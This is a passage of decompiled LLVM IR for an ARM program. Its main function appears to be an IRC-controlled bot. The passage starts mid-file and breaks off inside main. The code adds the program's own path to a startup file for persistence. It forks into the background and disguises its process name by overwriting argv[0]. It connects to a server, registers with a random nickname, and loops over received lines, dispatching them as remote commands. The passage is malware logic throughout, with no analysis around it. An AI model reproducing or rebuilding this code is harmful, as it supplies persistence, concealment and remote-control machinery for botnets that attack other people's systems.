  uselistorder i32 (i32, i32, i32)* @bcopy, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_9ea4, { 1, 0 }
  uselistorder label %dec_label_pc_9e84, { 1, 0 }
  uselistorder label %dec_label_pc_9d3c, { 1, 0 }
  uselistorder label %dec_label_pc_9be8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_9c40, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-2708 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-394 = alloca i32, align 4
  %stack_var_-1684 = alloca i32, align 4
  %stack_var_-660 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-6804 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9ee4 = load i32, i32* @r4, align 4
  store i32 %v3_9ee4, i32* %stack_var_-20, align 4
  store i32 40684, i32* %stack_var_-4, align 4
  %v16_9ee4 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9ee8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9ee8, i32* @fp, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_1336c.354 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1325c.292 to i32), i32* @r1, align 4
  %v3_9f3c = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1336c.354 to i32), i32 ptrtoint (i32* @global_var_1325c.292 to i32))
  %v2_9f4c = icmp eq i32 %v3_9f3c, 0
  br i1 %v2_9f4c, label %dec_label_pc_9f54, label %dec_label_pc_9f70

dec_label_pc_9f54:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_13380.357 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1325c.292 to i32), i32* @r1, align 4
  %v3_9f64 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_13380.357 to i32), i32 ptrtoint (i32* @global_var_1325c.292 to i32))
  br label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry, %dec_label_pc_9f54
  %stack_var_-76.0 = phi i32 [ %v3_9f64, %dec_label_pc_9f54 ], [ %v3_9f3c, %entry ]
  %stack_var_-80.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_13380.357, i32 0, i32 0), %dec_label_pc_9f54 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1336c.354, i32 0, i32 0), %entry ]
  %v2_9f74 = icmp eq i32 %stack_var_-76.0, 0
  br i1 %v2_9f74, label %dec_label_pc_a0fc, label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9f70
  %v1_9f8c = bitcast i8** %argv to i32*
  %v2_9f8c = load i32, i32* %v1_9f8c, align 4
  %v1_9f90 = inttoptr i32 %v2_9f8c to i8*
  %v3_9f94 = call i32 @strlen(i8* %v1_9f90)
  %v2_9fa8 = ptrtoint i32* %stack_var_-344 to i32
  %v2_9fb4 = call i32 @getcwd(i32 %v2_9fa8, i32 256)
  store i32 ptrtoint (i32* @global_var_13390.359 to i32), i32* @r1, align 4
  %v2_9fc4 = bitcast i32* %stack_var_-344 to i8*
  %v3_9fc4 = call i32 @__GI_strcoll(i8* %v2_9fc4, i32 ptrtoint (i32* @global_var_13390.359 to i32))
  %v2_9fcc = icmp eq i32 %v3_9fc4, 0
  br i1 %v2_9fcc, label %dec_label_pc_a0f4, label %dec_label_pc_9fe4

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fe4
  %v1_9fdc = add i32 %stack_var_-60.0, -1
  br label %dec_label_pc_9fe4

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9f7c, %dec_label_pc_9fd8
  %stack_var_-60.0 = phi i32 [ %v1_9fdc, %dec_label_pc_9fd8 ], [ %v3_9f94, %dec_label_pc_9f7c ]
  %v2_9ff4 = load i32, i32* %v1_9f8c, align 4
  %v2_9ffc = add i32 %v2_9ff4, %stack_var_-60.0
  %v1_a000 = inttoptr i32 %v2_9ffc to i8*
  %v2_a000 = load i8, i8* %v1_a000, align 1
  %v7_a004 = icmp eq i8 %v2_a000, 47
  br i1 %v7_a004, label %dec_label_pc_a00c, label %dec_label_pc_9fd8

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9fe4
  %v2_a01c = load i32, i32* %v1_9f8c, align 4
  %v2_a024 = add i32 %v2_a01c, %stack_var_-60.0
  %v2_a028 = ptrtoint i32* %stack_var_-660 to i32
  store i32 %v2_a028, i32* @r0, align 4
  %v5_a03c = call i32 @sprintf(i32 %v2_a028, i32 ptrtoint ([8 x i8]* @global_var_13394.361 to i32), i32 %v2_9fa8, i32 %v2_a024)
  %v1_a088 = inttoptr i32 %stack_var_-76.0 to i8*
  %v2_a044 = ptrtoint i32* %stack_var_-1684 to i32
  %v2_a068 = bitcast i32* %stack_var_-1684 to i8*
  br label %dec_label_pc_a084.outer

dec_label_pc_a044:                                ; preds = %dec_label_pc_a084
  %v3_a054 = call i32 @fgets(i32 %v2_a044, i32 1024, i32 %stack_var_-76.0)
  %v3_a068 = call i32 @__GI_strcasecmp(i8* %v2_a068, i32 %v2_a028)
  %v2_a070 = icmp eq i32 %v3_a068, 0
  br i1 %v2_a070, label %dec_label_pc_a078, label %dec_label_pc_a084

dec_label_pc_a078:                                ; preds = %dec_label_pc_a044
  %v1_a07c = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_a084.outer

dec_label_pc_a084.outer:                          ; preds = %dec_label_pc_a078, %dec_label_pc_a00c
  %stack_var_-56.0.ph = phi i32 [ %v1_a07c, %dec_label_pc_a078 ], [ 0, %dec_label_pc_a00c ]
  br label %dec_label_pc_a084

dec_label_pc_a084:                                ; preds = %dec_label_pc_a084.outer, %dec_label_pc_a044
  %v2_a088 = call i32 @feof(i8* %v1_a088)
  %v2_a090 = icmp eq i32 %v2_a088, 0
  br i1 %v2_a090, label %dec_label_pc_a044, label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a084
  %v2_a09c = icmp eq i32 %stack_var_-56.0.ph, 0
  %v2_a0a8 = call i32 @__GI_fclose(i8* %v1_a088)
  br i1 %v2_a09c, label %dec_label_pc_a0a4, label %dec_label_pc_a0fc

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a098
  %v4_a0ac = ptrtoint i8* %stack_var_-80.0 to i32
  store i32 %v4_a0ac, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1339c.363 to i32), i32* @r1, align 4
  %v3_a0b4 = call i32 @__GI_fopen(i32 %v4_a0ac, i32 ptrtoint (i32* @global_var_1339c.363 to i32))
  %v2_a0c4 = icmp eq i32 %v3_a0b4, 0
  br i1 %v2_a0c4, label %dec_label_pc_a0fc, label %dec_label_pc_a0cc

dec_label_pc_a0cc:                                ; preds = %dec_label_pc_a0a4
  %v2_a0d8 = call i32 @__GI_fputs(i32 %v2_a028, i32 %v3_a0b4)
  %v1_a0e0 = inttoptr i32 %v3_a0b4 to i8*
  %v2_a0e0 = call i32 @__GI_fclose(i8* %v1_a0e0)
  br label %dec_label_pc_a0fc

dec_label_pc_a0f4:                                ; preds = %dec_label_pc_9f7c
  %v1_a0f8 = inttoptr i32 %stack_var_-76.0 to i8*
  %v2_a0f8 = call i32 @__GI_fclose(i8* %v1_a0f8)
  br label %dec_label_pc_a0fc

dec_label_pc_a0fc:                                ; preds = %dec_label_pc_a098, %dec_label_pc_a0a4, %dec_label_pc_9f70, %dec_label_pc_a0cc, %dec_label_pc_a0f4
  %v0_a0fc = call i32 @__libc_fork()
  %v2_a104 = icmp eq i32 %v0_a0fc, 0
  br i1 %v2_a104, label %dec_label_pc_a114, label %dec_label_pc_a10c

dec_label_pc_a10c:                                ; preds = %dec_label_pc_a0fc
  %v1_a110 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a0fc, %dec_label_pc_a10c
  %v1_a124 = bitcast i8** %argv to i32*
  %v2_a124 = load i32, i32* %v1_a124, align 4
  store i32 %v2_a124, i32* @r4, align 4
  %v2_a138 = load i32, i32* %v1_a124, align 4
  %v1_a13c = inttoptr i32 %v2_a138 to i8*
  %v3_a140 = call i32 @strlen(i8* %v1_a13c)
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_133a0.365 to i32), i32* @r1, align 4
  %v4_a154 = call i32 @strncpy(i32 %v0_a148, i32 ptrtoint ([14 x i8]* @global_var_133a0.365 to i32), i32 %v3_a140)
  br label %dec_label_pc_a1d8

dec_label_pc_a164:                                ; preds = %dec_label_pc_a1d8
  %v3_a168 = mul i32 %storemerge14, 4
  %v2_a180 = add i32 %v3_a168, %tmp
  %v1_a184 = inttoptr i32 %v2_a180 to i32*
  %v2_a184 = load i32, i32* %v1_a184, align 4
  store i32 %v2_a184, i32* @r4, align 4
  %v2_a1a8 = load i32, i32* %v1_a184, align 4
  %v1_a1ac = inttoptr i32 %v2_a1a8 to i8*
  %v3_a1b0 = call i32 @strlen(i8* %v1_a1ac)
  %v0_a1b8 = load i32, i32* @r4, align 4
  store i32 %v3_a1b0, i32* @r2, align 4
  %v2_a1c8 = inttoptr i32 %v0_a1b8 to i8*
  %v3_a1c8 = call i32 @__GI_memset(i8* %v2_a1c8, i32 0)
  %v1_a1d0 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_a1d8

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a114, %dec_label_pc_a164
  %storemerge14 = phi i32 [ 1, %dec_label_pc_a114 ], [ %v1_a1d0, %dec_label_pc_a164 ]
  %v5_a1f0 = icmp slt i32 %storemerge14, %argc
  br i1 %v5_a1f0, label %dec_label_pc_a164, label %dec_label_pc_a1f4

dec_label_pc_a1f4:                                ; preds = %dec_label_pc_a1d8
  %v2_a1f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_a1f8, i32* @r4, align 4
  %v0_a200 = call i32 @__libc_getpid()
  %v0_a208 = load i32, i32* @r4, align 4
  %v2_a208 = xor i32 %v0_a208, %v0_a200
  store i32 %v2_a208, i32* @r4, align 4
  %v0_a20c = call i32 @getppid()
  %v0_a214 = load i32, i32* @r4, align 4
  %v2_a214 = add i32 %v0_a214, %v0_a20c
  %v1_a21c = call i32 @srand(i32 %v2_a214)
  %v1_a228 = call i32 @makestring(i32 %v1_a21c)
  %v2_a238 = ptrtoint i32* %stack_var_-394 to i32
  %v4_a244 = call i32 @strcpy(i32 %v2_a238, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1333c.341, i32 0, i32 0))
  store i32 %v1_a228, i32* @r1, align 4
  %v2_a258 = bitcast i32* %stack_var_-394 to i8*
  %v3_a258 = call i32 @strcat(i8* %v2_a258, i32 %v1_a228)
  store i32 %v2_a238, i32* @global_var_1fe58.314, align 4
  %v1_a26c = call i32 @makestring(i32 %v3_a258)
  store i32 %v1_a26c, i32* @global_var_1fe50.294, align 4
  %v1_a27c = call i32 @makestring(i32 %v1_a26c)
  store i32 %v1_a27c, i32* @global_var_1fe60.370, align 4
  store i32 ptrtoint (i32* @global_var_133b0.373 to i32), i32* @global_var_1fe70.301, align 4
  store i32 ptrtoint (i32* @global_var_133b4.376 to i32), i32* @global_var_1fe6c.324, align 4
  store i32 ptrtoint (i32* @global_var_133b4.376 to i32), i32* @global_var_1fe54.378, align 4
  store i32 0, i32* @global_var_1fe64.352, align 4
  %v2_a320 = ptrtoint i32* %stack_var_-660 to i32
  %v2_a3e0 = ptrtoint i32* %stack_var_-404 to i32
  %v2_a5fc = ptrtoint i32* %stack_var_-6804 to i32
  %v2_a638 = add i32 %v16_9ee4, -6784
  %v2_a6ec = ptrtoint i32* %stack_var_-2708 to i32
  %v2_a798 = ptrtoint i32* %stack_var_-1684 to i32
  %v3_a864 = bitcast i32* %stack_var_-1684 to i8*
  br label %dec_label_pc_a2c0

dec_label_pc_a2c0:                                ; preds = %dec_label_pc_a5f0, %dec_label_pc_a35c, %dec_label_pc_a858, %dec_label_pc_a1f4
  %v0_a2c0 = call i32 @con()
  %v2_a2c8 = load i32, i32* @global_var_1fe5c.343, align 4
  %v2_a2d0 = load i32, i32* @global_var_1fe54.378, align 4
  %v4_a2e0 = call i32 @Send(i32 %v2_a2c8, i32 ptrtoint ([9 x i8]* @global_var_133b8.382 to i32), i32 %v2_a2d0)
  %v2_a2e8 = load i32, i32* @global_var_1fe5c.343, align 4
  %v2_a2f0 = load i32, i32* @global_var_1fe58.314, align 4
  %v2_a2f8 = load i32, i32* @global_var_1fe50.294, align 4
  store i32 %v2_a2f8, i32* @lr, align 4
  %v4_a318 = call i32 @Send(i32 %v2_a2e8, i32 ptrtoint ([41 x i8]* @global_var_133c4.384 to i32), i32 %v2_a2f0)
  br label %dec_label_pc_a334.lr.ph

dec_label_pc_a334.lr.ph:                          ; preds = %dec_label_pc_a5a8, %dec_label_pc_a628, %dec_label_pc_a874, %dec_label_pc_a894, %dec_label_pc_a2c0
  br label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a334.lr.ph, %dec_label_pc_a334
  %storemerge1529 = phi i32 [ 0, %dec_label_pc_a334.lr.ph ], [ %v1_a348, %dec_label_pc_a334 ]
  %v5_a340 = mul nuw nsw i32 %storemerge1529, 4
  %v6_a340 = add i32 %v5_a340, %v2_a320
  %v7_a340 = inttoptr i32 %v6_a340 to i32*
  store i32 0, i32* %v7_a340, align 4
  %v1_a348 = add nuw nsw i32 %storemerge1529, 1
  %tmp74 = icmp ult i32 %v1_a348, 32
  br i1 %tmp74, label %dec_label_pc_a334, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a334
  %v2_a360 = load i32, i32* @global_var_1fe5c.343, align 4
  %v3_a364 = udiv i32 %v2_a360, 32
  %v3_a378 = mul nuw nsw i32 %v3_a364, 4
  %v2_a380 = add i32 %v3_a378, %v16_9ee4
  %v2_a384 = add i32 %v2_a380, -640
  %v1_a388 = inttoptr i32 %v2_a384 to i32*
  %v2_a388 = load i32, i32* %v1_a388, align 4
  %v1_a394 = urem i32 %v2_a360, 32
  %v6_a39c = shl i32 1, %v1_a394
  %v2_a3a0 = or i32 %v2_a388, %v6_a39c
  store i32 %v2_a3a0, i32* %v1_a388, align 4
  store i32 1200, i32* %stack_var_-404, align 4
  %v2_a3d4 = load i32, i32* @global_var_1fe5c.343, align 4
  %v1_a3d8 = add i32 %v2_a3d4, 1
  %v5_a3f4 = call i32 @__libc_select(i32 %v1_a3d8, i32 %v2_a320, i32 0, i32 0, i32 %v2_a3e0)
  %tmp75 = icmp slt i32 %v5_a3f4, 1
  br i1 %tmp75, label %dec_label_pc_a2c0, label %dec_label_pc_a594.preheader

dec_label_pc_a594.preheader:                      ; preds = %dec_label_pc_a35c
  %v2_a598105 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_a5a0107 = icmp eq i32 %v2_a598105, 0
  br i1 %v3_a5a0107, label %dec_label_pc_a5a8, label %dec_label_pc_a410

dec_label_pc_a410:                                ; preds = %dec_label_pc_a588, %dec_label_pc_a594.preheader
  %storemerge16114 = phi i32 [ %.pre132, %dec_label_pc_a588 ], [ 0, %dec_label_pc_a594.preheader ]
  %v3_a414 = mul i32 %storemerge16114, 4
  %v2_a420 = load i32, i32* @global_var_1fe74.288, align 4
  %v2_a424 = add i32 %v2_a420, %v3_a414
  %v1_a428 = inttoptr i32 %v2_a424 to i32*
  %v2_a428 = load i32, i32* %v1_a428, align 4
  %v3_a438 = call i32 @__libc_waitpid(i32 %v2_a428, i32 0, i32 1)
  %tmp76 = icmp slt i32 %v3_a438, 1
  %.pre132 = add i32 %storemerge16114, 1
  br i1 %tmp76, label %dec_label_pc_a588, label %dec_label_pc_a4a0.preheader

dec_label_pc_a4a0.preheader:                      ; preds = %dec_label_pc_a410
  %v2_a4a484 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_a4ac86 = icmp ult i32 %.pre132, %v2_a4a484
  %v3_a4b887 = mul i32 %.pre132, 4
  %v2_a4c488 = load i32, i32* @global_var_1fe74.288, align 4
  %v2_a4c889 = add i32 %v2_a4c488, %v3_a4b887
  %v1_a4cc90 = add i32 %v2_a4c889, -4
  br i1 %v3_a4ac86, label %dec_label_pc_a458, label %dec_label_pc_a4b4

dec_label_pc_a458:                                ; preds = %dec_label_pc_a4a0.preheader, %dec_label_pc_a458
  %v1_a4cc94 = phi i32 [ %v1_a4cc, %dec_label_pc_a458 ], [ %v1_a4cc90, %dec_label_pc_a4a0.preheader ]
  %v2_a4c893 = phi i32 [ %v2_a4c8, %dec_label_pc_a458 ], [ %v2_a4c889, %dec_label_pc_a4a0.preheader ]
  %v1_a44c91 = phi i32 [ %v1_a44c, %dec_label_pc_a458 ], [ %.pre132, %dec_label_pc_a4a0.preheader ]
  %v1_a48c = inttoptr i32 %v2_a4c893 to i32*
  %v2_a48c = load i32, i32* %v1_a48c, align 4
  %v2_a490 = inttoptr i32 %v1_a4cc94 to i32*
  store i32 %v2_a48c, i32* %v2_a490, align 4
  %v1_a44c = add i32 %v1_a44c91, 1
  %v2_a4a4 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_a4ac = icmp ult i32 %v1_a44c, %v2_a4a4
  %v3_a4b8 = mul i32 %v1_a44c, 4
  %v2_a4c4 = load i32, i32* @global_var_1fe74.288, align 4
  %v2_a4c8 = add i32 %v2_a4c4, %v3_a4b8
  %v1_a4cc = add i32 %v2_a4c8, -4
  br i1 %v3_a4ac, label %dec_label_pc_a458, label %dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge

dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge:    ; preds = %dec_label_pc_a458
  br label %dec_label_pc_a4b4

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge, %dec_label_pc_a4a0.preheader
  %v1_a4cc.lcssa = phi i32 [ %v1_a4cc, %dec_label_pc_a4a0.dec_label_pc_a4b4_crit_edge ], [ %v1_a4cc90, %dec_label_pc_a4a0.preheader ]
  %v2_a4d4 = inttoptr i32 %v1_a4cc.lcssa to i32*
  store i32 0, i32* %v2_a4d4, align 4
  %v2_a4dc = load i32, i32* @global_var_1d7fc.286, align 4
  %v1_a4e0 = add i32 %v2_a4dc, -1
  store i32 %v1_a4e0, i32* @global_var_1d7fc.286, align 4
  %v3_a4f4 = mul i32 %v1_a4e0, 4
  %v1_a4f8 = add i32 %v3_a4f4, 4
  %v1_a500 = call i32 @malloc(i32 %v1_a4f8)
  %v2_a55c98 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_a564100 = icmp eq i32 %v2_a55c98, 0
  br i1 %v3_a564100, label %dec_label_pc_a56c, label %dec_label_pc_a518

dec_label_pc_a518:                                ; preds = %dec_label_pc_a4b4, %dec_label_pc_a518
  %storemerge18101 = phi i32 [ %v1_a550, %dec_label_pc_a518 ], [ 0, %dec_label_pc_a4b4 ]
  %v3_a51c = mul i32 %storemerge18101, 4
  %v2_a528 = add i32 %v3_a51c, %v1_a500
  %v2_a53c = load i32, i32* @global_var_1fe74.288, align 4
  %v2_a540 = add i32 %v2_a53c, %v3_a51c
  %v1_a544 = inttoptr i32 %v2_a540 to i32*
  %v2_a544 = load i32, i32* %v1_a544, align 4
  %v2_a548 = inttoptr i32 %v2_a528 to i32*
  store i32 %v2_a544, i32* %v2_a548, align 4
  %v1_a550 = add i32 %storemerge18101, 1
  %v2_a55c = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_a564 = icmp ult i32 %v1_a550, %v2_a55c
  br i1 %v3_a564, label %dec_label_pc_a518, label %dec_label_pc_a558.dec_label_pc_a56c_crit_edge

dec_label_pc_a558.dec_label_pc_a56c_crit_edge:    ; preds = %dec_label_pc_a518
  br label %dec_label_pc_a56c

dec_label_pc_a56c:                                ; preds = %dec_label_pc_a4b4, %dec_label_pc_a558.dec_label_pc_a56c_crit_edge
  %v2_a570 = load i32, i32* @global_var_1fe74.288, align 4
  store i32 %v2_a570, i32* @r0, align 4
  %v0_a578 = call i32 @free()
  store i32 %v1_a500, i32* @global_var_1fe74.288, align 4
  br label %dec_label_pc_a588

dec_label_pc_a588:                                ; preds = %dec_label_pc_a410, %dec_label_pc_a56c
  %v2_a598 = load i32, i32* @global_var_1d7fc.286, align 4
  %v3_a5a0 = icmp ult i32 %.pre132, %v2_a598
  br i1 %v3_a5a0, label %dec_label_pc_a410, label %dec_label_pc_a5a8

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a588, %dec_label_pc_a594.preheader
  %v2_a5ac = load i32, i32* @global_var_1fe5c.343, align 4
  %v3_a5b0 = udiv i32 %v2_a5ac, 32
  %v3_a5bc = mul nuw nsw i32 %v3_a5b0, 4
  %v2_a5c4 = add i32 %v3_a5bc, %v16_9ee4
  %v2_a5c8 = add i32 %v2_a5c4, -640
  %v1_a5cc = inttoptr i32 %v2_a5c8 to i32*
  %v2_a5cc = load i32, i32* %v1_a5cc, align 4
  %v1_a5d8 = urem i32 %v2_a5ac, 32
  %v6_a5dc5 = lshr i32 %v2_a5cc, %v1_a5d8
  %v1_a5e4 = urem i32 %v6_a5dc5, 2
  %v2_a5e8 = icmp eq i32 %v1_a5e4, 0
  br i1 %v2_a5e8, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a5f0

dec_label_pc_a5f0:                                ; preds = %dec_label_pc_a5a8
  %v5_a610 = call i32 @__libc_recv(i32 %v2_a5ac, i32* nonnull %stack_var_-6804, i32 4096, i32 0)
  %tmp77 = icmp slt i32 %v5_a610, 1
  br i1 %tmp77, label %dec_label_pc_a2c0, label %dec_label_pc_a628

dec_label_pc_a628:                                ; preds = %dec_label_pc_a5f0
  %v2_a63c = add i32 %v2_a638, %v5_a610
  %v3_a63c = inttoptr i32 %v2_a63c to i8*
  store i8 0, i8* %v3_a63c, align 1
  store i32 %v2_a5fc, i32* @r0, align 4
  %v6_a658 = call i32 @__GI_strtok(i32 %v2_a5fc, i32 ptrtoint (i32* @global_var_133f0.388 to i32), i32 %v2_a63c, i32 %v2_a5fc, i32 %v5_a610)
  %v2_a88c32 = icmp eq i32 %v6_a658, 0
  br i1 %v2_a88c32, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a894

dec_label_pc_a668:                                ; preds = %dec_label_pc_a894
  %v3_a66c = call i32 @filter(i8* nonnull %storemerge34)
  %v2_a674 = load i8, i8* %storemerge34, align 1
  %v7_a678 = icmp eq i8 %v2_a674, 58
  br i1 %v7_a678, label %dec_label_pc_a698, label %dec_label_pc_a720

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a6b0
  %v1_a690 = add i32 %storemerge23, 1
  br label %dec_label_pc_a698

dec_label_pc_a698:                                ; preds = %dec_label_pc_a668, %dec_label_pc_a68c
  %storemerge23 = phi i32 [ %v1_a690, %dec_label_pc_a68c ], [ 0, %dec_label_pc_a668 ]
  %v3_a6a0 = call i32 @strlen(i8* %storemerge34)
  %v3_a6a8 = icmp ult i32 %storemerge23, %v3_a6a0
  br i1 %v3_a6a8, label %dec_label_pc_a6b0, label %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge

dec_label_pc_a698.dec_label_pc_a6cc_crit_edge:    ; preds = %dec_label_pc_a698
  %.pre = add i32 %storemerge23, %storemerge34.in
  %.pre35 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_a6cc

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_a698
  %v2_a6bc = add i32 %storemerge23, %storemerge34.in
  %v1_a6c0 = inttoptr i32 %v2_a6bc to i8*
  %v2_a6c0 = load i8, i8* %v1_a6c0, align 1
  %v7_a6c4 = icmp eq i8 %v2_a6c0, 32
  br i1 %v7_a6c4, label %dec_label_pc_a6cc, label %dec_label_pc_a68c

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a6b0, %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge
  %v3_a6e0.pre-phi = phi i8* [ %.pre35, %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge ], [ %v1_a6c0, %dec_label_pc_a6b0 ]
  %v2_a6d8.pre-phi = phi i32 [ %.pre, %dec_label_pc_a698.dec_label_pc_a6cc_crit_edge ], [ %v2_a6bc, %dec_label_pc_a6b0 ]
  store i8 0, i8* %v3_a6e0.pre-phi, align 1
  %v1_a6e8 = add i32 %storemerge34.in, 1
  %v2_a6f8 = inttoptr i32 %v1_a6e8 to i8*
  %v3_a6f8 = call i32 @strcpy(i32 %v2_a6ec, i8* %v2_a6f8)
  %v1_a70c = add i32 %v2_a6d8.pre-phi, 1
  %v3_a718 = inttoptr i32 %v1_a70c to i8*
  %v4_a718 = call i32 @strcpy(i32 %storemerge34.in, i8* %v3_a718)
  br label %dec_label_pc_a74c

dec_label_pc_a720:                                ; preds = %dec_label_pc_a668
  store i32 42, i32* %stack_var_-2708, align 4
  br label %dec_label_pc_a74c

dec_label_pc_a740:                                ; preds = %dec_label_pc_a764
  %v1_a744 = add i32 %storemerge20, 1
  br label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a720, %dec_label_pc_a6cc, %dec_label_pc_a740
  %storemerge20 = phi i32 [ %v1_a744, %dec_label_pc_a740 ], [ 0, %dec_label_pc_a6cc ], [ 0, %dec_label_pc_a720 ]
  store i32 %storemerge20, i32* @r4, align 4
  %v3_a754 = call i32 @strlen(i8* %storemerge34)
  %v0_a75c = load i32, i32* @r4, align 4
  %v3_a75c = icmp ult i32 %v0_a75c, %v3_a754
  br i1 %v3_a75c, label %dec_label_pc_a764, label %dec_label_pc_a74c.dec_label_pc_a780_crit_edge

dec_label_pc_a74c.dec_label_pc_a780_crit_edge:    ; preds = %dec_label_pc_a74c
  %.pre36 = add i32 %storemerge20, %storemerge34.in
  %.pre37 = inttoptr i32 %.pre36 to i8*
  br label %dec_label_pc_a780

dec_label_pc_a764:                                ; preds = %dec_label_pc_a74c
  %v2_a770 = add i32 %storemerge20, %storemerge34.in
  %v1_a774 = inttoptr i32 %v2_a770 to i8*
  %v2_a774 = load i8, i8* %v1_a774, align 1
  %v7_a778 = icmp eq i8 %v2_a774, 32
  br i1 %v7_a778, label %dec_label_pc_a780, label %dec_label_pc_a740

dec_label_pc_a780:                                ; preds = %dec_label_pc_a764, %dec_label_pc_a74c.dec_label_pc_a780_crit_edge
  %v3_a794.pre-phi = phi i8* [ %.pre37, %dec_label_pc_a74c.dec_label_pc_a780_crit_edge ], [ %v1_a774, %dec_label_pc_a764 ]
  %v2_a78c.pre-phi = phi i32 [ %.pre36, %dec_label_pc_a74c.dec_label_pc_a780_crit_edge ], [ %v2_a770, %dec_label_pc_a764 ]
  store i8 0, i8* %v3_a794.pre-phi, align 1
  %v4_a7a4 = call i32 @strcpy(i32 %v2_a798, i8* %storemerge34)
  %v1_a7b8 = add i32 %v2_a78c.pre-phi, 1
  %v3_a7c4 = inttoptr i32 %v1_a7b8 to i8*
  %v4_a7c4 = call i32 @strcpy(i32 %storemerge34.in, i8* %v3_a7c4)
  %v8_a84c115 = load i32, i32* bitcast ([4 x i8]** @global_var_1d434.391 to i32*), align 4
  %v2_a850117 = icmp eq i32 %v8_a84c115, 0
  br i1 %v2_a850117, label %dec_label_pc_a858, label %dec_label_pc_a7d4

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_a780, %dec_label_pc_a7d4
  %v7_a84c120 = phi i32* [ %v7_a84c, %dec_label_pc_a7d4 ], [ bitcast ([4 x i8]** @global_var_1d434.391 to i32*), %dec_label_pc_a780 ]
  %storemerge21118 = phi i32 [ %v1_a83c, %dec_label_pc_a7d4 ], [ 0, %dec_label_pc_a780 ]
  %v7_a7dc = load i32, i32* %v7_a84c120, align 4
  %v2_a7ec = inttoptr i32 %v7_a7dc to i8*
  %v3_a7ec = call i32 @__GI_strcasecmp(i8* %v2_a7ec, i32 %v2_a798)
  %v3_a808 = mul i32 %storemerge21118, 8
  %v2_a810 = add i32 %v3_a808, add (i32 ptrtoint ([4 x i8]** @global_var_1d434.391 to i32), i32 4)
  %v1_a814 = inttoptr i32 %v2_a810 to i32*
  %v2_a814 = load i32, i32* %v1_a814, align 4
  store i32 %v2_a814, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_a814)
  %v1_a83c = add i32 %storemerge21118, 1
  %v5_a84c = mul i32 %v1_a83c, 8
  %v6_a84c = add i32 %v5_a84c, ptrtoint ([4 x i8]** @global_var_1d434.391 to i32)
  %v7_a84c = inttoptr i32 %v6_a84c to i32*
  %v8_a84c = load i32, i32* %v7_a84c, align 4
  %v2_a850 = icmp eq i32 %v8_a84c, 0
  br i1 %v2_a850, label %dec_label_pc_a858, label %dec_label_pc_a7d4

dec_label_pc_a858:                                ; preds = %dec_label_pc_a7d4, %dec_label_pc_a780
  %v4_a864 = call i32 @__GI_strcasecmp(i8* %v3_a864, i32 ptrtoint ([6 x i8]* @global_var_133f4.393 to i32))
  %v2_a86c = icmp eq i32 %v4_a864, 0
  br i1 %v2_a86c, label %dec_label_pc_a2c0, label %dec_label_pc_a874

dec_label_pc_a874:                                ; preds = %dec_label_pc_a858
  store i32 0, i32* @r0, align 4
  %v6_a87c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_133f0.388 to i32), i32 ptrtoint ([4 x i8]** @global_var_1d434.391 to i32), i32 %v4_a864, i32 ptrtoint (i32* @0 to i32))
  %v2_a88c = icmp eq i32 %v6_a87c, 0
